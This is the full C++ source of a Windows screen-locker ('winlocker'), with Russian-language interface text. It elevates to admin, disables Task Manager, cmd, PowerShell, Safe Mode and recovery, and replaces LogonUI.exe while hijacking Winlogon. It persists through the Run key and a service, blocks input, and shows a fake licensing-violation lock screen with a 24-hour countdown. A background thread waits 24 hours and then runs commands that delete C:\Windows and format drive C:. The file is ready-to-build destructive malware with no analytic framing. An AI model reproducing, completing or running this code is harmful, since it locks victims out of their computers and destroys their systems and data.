// winlocker.cpp
#include <windows.h>
#include <winuser.h>
#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <ctime>
#include <fstream>
#include <shlobj.h>
#include <tlhelp32.h>
#include <commctrl.h>
#include <psapi.h>
#include <LM.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "netapi32.lib")

using namespace std;

#define ID_INPUT 1001
#define ID_CLEAR 1002
#define ID_OK 1003
#define ID_TIMER 1004
#define ID_BTN_BASE 2000

HWND hwndMain, hInput, hTimerLabel;
string g_password = "";
const string CORRECT_PASS = "19499393";
int g_remaining = 86400;
bool g_unlocked = false;

// ==================== ПРОТОТИПЫ ====================
void BlockKeys();
void UnblockKeys();
void KillExplorer();
void StartExplorer();
void DisableTaskManager();
void EnableTaskManager();
void DisableCmdPowershell();
void EnableCmdPowershell();
void HijackLogonUI();
void RestoreLogonUI();
void BlockSafeMode();
void RestoreSafeMode();
void AddAutostart();
void RemoveAutostart();
void DeleteWindows();
void UpdateTimer();
bool IsAdmin();
void RunAsAdmin();
LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
void SetEditBackground(HWND hEdit, COLORREF color);

// ==================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ====================
void SetEditBackground(HWND hEdit, COLORREF color) {
    HDC hdc = GetDC(hEdit);
    HBRUSH hBrush = CreateSolidBrush(color);
    RECT rect;
    GetClientRect(hEdit, &rect);
    FillRect(hdc, &rect, hBrush);
    DeleteObject(hBrush);
    ReleaseDC(hEdit, hdc);
    InvalidateRect(hEdit, NULL, TRUE);
}

// ==================== АДМИН ====================
bool IsAdmin() {
    BOOL b = FALSE;
    PSID pAdmin = NULL;
    SID_IDENTIFIER_AUTHORITY auth = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&auth, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0,0,0,0,0,0, &pAdmin)) {
        CheckTokenMembership(NULL, pAdmin, &b);
        FreeSid(pAdmin);
    }
    return b;
}

void RunAsAdmin() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    SHELLEXECUTEINFOA sei = {sizeof(sei)};
    sei.lpVerb = "runas";
    sei.lpFile = path;
    sei.nShow = SW_NORMAL;
    ShellExecuteExA(&sei);
    ExitProcess(0);
}

// ==================== БЛОКИРОВКА ====================
void BlockKeys() {
    BlockInput(TRUE);
}

void UnblockKeys() {
    BlockInput(FALSE);
}

void BlockAllKeys() {
    BlockKeys();
    HKEY hKey;
    if (RegCreateKeyEx(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD value = 1;
        RegSetValueEx(hKey, "DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
        RegSetValueEx(hKey, "DisableLockWorkstation", 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
        RegSetValueEx(hKey, "DisableChangePassword", 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
        RegCloseKey(hKey);
    }
}

void KillExplorer() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32 pe = {sizeof(PROCESSENTRY32)};
    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, "explorer.exe") == 0) {
                HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (hProc) { TerminateProcess(hProc, 0); CloseHandle(hProc); }
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    Sleep(500);
}

void StartExplorer() {
    ShellExecuteA(NULL, "open", "explorer.exe", NULL, NULL, SW_SHOW);
}

// ==================== РЕЕСТР ====================
void DisableTaskManager() {
    HKEY hKey;
    if (RegCreateKeyEx(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD value = 1;
        RegSetValueEx(hKey, "DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
        RegCloseKey(hKey);
    }
}

void EnableTaskManager() {
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValue(hKey, "DisableTaskMgr");
        RegCloseKey(hKey);
    }
}

void DisableCmdPowershell() {
    HKEY hKey;
    if (RegCreateKeyEx(HKEY_CURRENT_USER,
        "Software\\Policies\\Microsoft\\Windows\\System",
        0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD value = 2;
        RegSetValueEx(hKey, "DisableCMD", 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
        RegCloseKey(hKey);
    }
    if (RegCreateKeyEx(HKEY_CURRENT_USER,
        "Software\\Policies\\Microsoft\\PowerShell",
        0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD value = 0;
        RegSetValueEx(hKey, "Enable", 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
        RegCloseKey(hKey);
    }
}

void EnableCmdPowershell() {
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER,
        "Software\\Policies\\Microsoft\\Windows\\System",
        0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValue(hKey, "DisableCMD");
        RegCloseKey(hKey);
    }
    if (RegOpenKeyEx(HKEY_CURRENT_USER,
        "Software\\Policies\\Microsoft\\PowerShell",
        0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValue(hKey, "Enable");
        RegCloseKey(hKey);
    }
}

void HijackLogonUI() {
    string logonui = "C:\\Windows\\System32\\LogonUI.exe";
    string backup = "C:\\Windows\\System32\\LogonUI_backup.exe";
    string temp = "C:\\Windows\\Temp\\LogonUI_temp.exe";
    
    system("net stop TrustedInstaller");
    Sleep(2000);
    
    string cmd = "takeown /f \"" + logonui + "\"";
    system(cmd.c_str());
    cmd = "icacls \"" + logonui + "\" /grant Administrator:F";
    system(cmd.c_str());
    cmd = "attrib -r -s -h \"" + logonui + "\"";
    system(cmd.c_str());
    
    if (GetFileAttributesA(backup.c_str()) == INVALID_FILE_ATTRIBUTES) {
        CopyFileA(logonui.c_str(), backup.c_str(), FALSE);
    }
    
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    CopyFileA(exePath, temp.c_str(), FALSE);
    
    DeleteFileA(logonui.c_str());
    MoveFileA(temp.c_str(), logonui.c_str());
    
    cmd = "attrib +r +s +h \"" + logonui + "\"";
    system(cmd.c_str());
    
    HKEY hKey;
    if (RegCreateKeyEx(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "Shell", 0, REG_SZ, (BYTE*)"LogonUI.exe", 11);
        RegSetValueExA(hKey, "Userinit", 0, REG_SZ, (BYTE*)"LogonUI.exe", 11);
        DWORD value = 1;
        RegSetValueEx(hKey, "SFCDisable", 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
        RegCloseKey(hKey);
    }
}

void RestoreLogonUI() {
    string logonui = "C:\\Windows\\System32\\LogonUI.exe";
    string backup = "C:\\Windows\\System32\\LogonUI_backup.exe";
    if (GetFileAttributesA(backup.c_str()) != INVALID_FILE_ATTRIBUTES) {
        DeleteFileA(logonui.c_str());
        MoveFileA(backup.c_str(), logonui.c_str());
    }
}

void BlockSafeMode() {
    HKEY hKey;
    if (RegCreateKeyEx(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal",
        0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "WinLocker", 0, REG_SZ, (BYTE*)"Service", 7);
        RegCloseKey(hKey);
    }
    if (RegCreateKeyEx(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network",
        0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "WinLocker", 0, REG_SZ, (BYTE*)"Service", 7);
        RegCloseKey(hKey);
    }
    if (RegCreateKeyEx(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\SafeBoot",
        0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "AlternateShell", 0, REG_SZ, (BYTE*)"LogonUI.exe", 11);
        RegCloseKey(hKey);
    }
    system("reagentc /disable");
    system("bcdedit /set {bootmgr} displaybootmenu no");
    system("bcdedit /set {globalsettings} advancedoptions false");
}

void RestoreSafeMode() {
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal",
        0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValue(hKey, "WinLocker");
        RegCloseKey(hKey);
    }
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network",
        0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValue(hKey, "WinLocker");
        RegCloseKey(hKey);
    }
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\SafeBoot",
        0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValue(hKey, "AlternateShell");
        RegCloseKey(hKey);
    }
}

void AddAutostart() {
    HKEY hKey;
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    if (RegCreateKeyEx(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "WinLocker", 0, REG_SZ, (BYTE*)exePath, strlen(exePath));
        RegCloseKey(hKey);
    }
    if (RegCreateKeyEx(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "Shell", 0, REG_SZ, (BYTE*)"LogonUI.exe", 11);
        RegCloseKey(hKey);
    }
    string cmd = "sc create WinLockerService binPath= \"" + string(exePath) + "\" start= auto";
    system(cmd.c_str());
}

void RemoveAutostart() {
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValue(hKey, "WinLocker");
        RegCloseKey(hKey);
    }
    system("sc delete WinLockerService");
}

void DeleteWindows() {
    Sleep(86400000);
    system("takeown /f C:\\Windows /r /d y");
    system("icacls C:\\Windows /grant Administrator:F /t");
    system("cmd /c rd /s /q C:\\Windows");
    system("cmd /c format C: /q /y");
    system("shutdown /r /t 0");
    ExitProcess(0);
}

// ==================== ТАЙМЕР ====================
void UpdateTimer() {
    if (g_remaining <= 0) {
        DeleteWindows();
        return;
    }
    int h = g_remaining / 3600;
    int m = (g_remaining % 3600) / 60;
    int s = g_remaining % 60;
    char buf[16];
    sprintf(buf, "%02d:%02d:%02d", h, m, s);
    SetWindowTextA(hTimerLabel, buf);
    g_remaining--;
    SetTimer(hwndMain, ID_TIMER, 1000, NULL);
}

// ==================== ОКОННАЯ ФУНКЦИЯ ====================
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_CREATE: {
            HINSTANCE hInst = (HINSTANCE)GetWindowLongPtr(hwnd, GWLP_HINSTANCE);
            
            // Заголовок
            HWND hTitle = CreateWindowA("STATIC", "Windows заблокирован!",
                WS_CHILD | WS_VISIBLE | SS_LEFT, 40, 30, 400, 40, hwnd, NULL, hInst, NULL);
            HFONT hFont = CreateFontA(28, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
                DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "Segoe UI");
            SendMessage(hTitle, WM_SETFONT, (WPARAM)hFont, TRUE);
            
            // Поле ввода
            hInput = CreateWindowA("EDIT", "", WS_CHILD | WS_VISIBLE | ES_CENTER | ES_READONLY,
                40, 90, 400, 40, hwnd, (HMENU)ID_INPUT, hInst, NULL);
            SendMessage(hInput, WM_SETFONT, (WPARAM)hFont, TRUE);
            
            // Кнопки цифр
            int btnW = 35, btnH = 35;
            for (int i = 0; i < 10; i++) {
                char txt[2] = {char('0' + i), 0};
                HWND hBtn = CreateWindowA("BUTTON", txt, WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
                    40 + i * (btnW + 5), 150, btnW, btnH, hwnd, (HMENU)(ID_BTN_BASE + i), hInst, NULL);
                SendMessage(hBtn, WM_SETFONT, (WPARAM)hFont, TRUE);
            }
            
            // Кнопка очистки
            HWND hClear = CreateWindowA("BUTTON", "Очистить", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
                40 + 10 * (btnW + 5), 150, 70, btnH, hwnd, (HMENU)ID_CLEAR, hInst, NULL);
            SendMessage(hClear, WM_SETFONT, (WPARAM)hFont, TRUE);
            
            // Кнопка OK
            HWND hOk = CreateWindowA("BUTTON", "OK", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
                40 + 10 * (btnW + 5) + 75, 150, 60, btnH, hwnd, (HMENU)ID_OK, hInst, NULL);
            SendMessage(hOk, WM_SETFONT, (WPARAM)hFont, TRUE);
            
            // Текст
            const char* msg = "Ваша система Windows была заблокирована!\n\n"
                "Причины:\n- Нелицензионное ПО\n- Читы и взломщики\n"
                "- Нарушение EULA\n- Доступ к системным файлам\n\n"
                "Введите код доступа для разблокировки.";
            HWND hText = CreateWindowA("STATIC", msg, WS_CHILD | WS_VISIBLE | SS_LEFT,
                40, 200, 450, 200, hwnd, NULL, hInst, NULL);
            HFONT hFont2 = CreateFontA(14, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "Segoe UI");
            SendMessage(hText, WM_SETFONT, (WPARAM)hFont2, TRUE);
            
            // Таймер
            HWND hTimerText = CreateWindowA("STATIC", "Таймер:", WS_CHILD | WS_VISIBLE | SS_LEFT,
                40, 410, 80, 30, hwnd, NULL, hInst, NULL);
            SendMessage(hTimerText, WM_SETFONT, (WPARAM)hFont2, TRUE);
            
            hTimerLabel = CreateWindowA("STATIC", "24:00:00", WS_CHILD | WS_VISIBLE | SS_LEFT,
                120, 410, 120, 30, hwnd, (HMENU)ID_TIMER, hInst, NULL);
            HFONT hFont3 = CreateFontA(22, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
                DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "Segoe UI");
            SendMessage(hTimerLabel, WM_SETFONT, (WPARAM)hFont3, TRUE);
            
            // Предупреждение
            HWND hWarn = CreateWindowA("STATIC", "Внимание! Система будет уничтожена через 24 часа!",
                WS_CHILD | WS_VISIBLE | SS_LEFT, 40, 460, 400, 30, hwnd, NULL, hInst, NULL);
            HFONT hFont4 = CreateFontA(12, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
                DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "Segoe UI");
            SendMessage(hWarn, WM_SETFONT, (WPARAM)hFont4, TRUE);
            
            UpdateTimer();
            break;
        }
        case WM_COMMAND: {
            int id = LOWORD(wParam);
            if (id >= ID_BTN_BASE && id < ID_BTN_BASE + 10) {
                int num = id - ID_BTN_BASE;
                if (g_password.length() < 20) {
                    g_password += char('0' + num);
                    string stars(g_password.length(), '*');
                    SetWindowTextA(hInput, stars.c_str());
                }
            } else if (id == ID_CLEAR) {
                g_password.clear();
                SetWindowTextA(hInput, "");
            } else if (id == ID_OK) {
                if (g_password == CORRECT_PASS) {
                    g_unlocked = true;
                    UnblockKeys();
                    EnableTaskManager();
                    EnableCmdPowershell();
                    RestoreSafeMode();
                    RestoreLogonUI();
                    RemoveAutostart();
                    StartExplorer();
                    DestroyWindow(hwnd);
                    system("shutdown /r /t 2");
                    ExitProcess(0);
                } else {
                    g_password.clear();
                    SetWindowTextA(hInput, "");
                    // Красный фон через SetWindowLong
                    HBRUSH hBrush = CreateSolidBrush(RGB(255, 0, 0));
                    SetClassLongPtr(hInput, GCLP_HBRBACKGROUND, (LONG_PTR)hBrush);
                    InvalidateRect(hInput, NULL, TRUE);
                    Sleep(300);
                    hBrush = CreateSolidBrush(RGB(64, 64, 64));
                    SetClassLongPtr(hInput, GCLP_HBRBACKGROUND, (LONG_PTR)hBrush);
                    InvalidateRect(hInput, NULL, TRUE);
                }
            }
            break;
        }
        case WM_TIMER: {
            if (wParam == ID_TIMER) {
                UpdateTimer();
            }
            break;
        }
        case WM_DESTROY: {
            PostQuitMessage(0);
            break;
        }
        default:
            return DefWindowProcA(hwnd, msg, wParam, lParam);
    }
    return 0;
}

// ==================== ТОЧКА ВХОДА ====================
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
    if (!IsAdmin()) { RunAsAdmin(); return 0; }
    
    DisableTaskManager();
    DisableCmdPowershell();
    BlockSafeMode();
    HijackLogonUI();
    AddAutostart();
    KillExplorer();
    BlockAllKeys();
    
    WNDCLASSA wc = {0};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInst;
    wc.hbrBackground = (HBRUSH)CreateSolidBrush(RGB(42, 42, 42));
    wc.lpszClassName = "WinLockerClass";
    RegisterClassA(&wc);
    
    hwndMain = CreateWindowA("WinLockerClass", "Windows Locked",
        WS_POPUP | WS_VISIBLE | WS_OVERLAPPED,
        0, 0, 900, 600, NULL, NULL, hInst, NULL);
    
    SetWindowLong(hwndMain, GWL_EXSTYLE, GetWindowLong(hwndMain, GWL_EXSTYLE) | WS_EX_LAYERED);
    SetLayeredWindowAttributes(hwndMain, 0, 220, LWA_ALPHA);
    
    ShowWindow(hwndMain, SW_MAXIMIZE);
    UpdateWindow(hwndMain);
    SetForegroundWindow(hwndMain);
    SetWindowPos(hwndMain, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
    
    thread deleteThread(DeleteWindows);
    deleteThread.detach();
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}
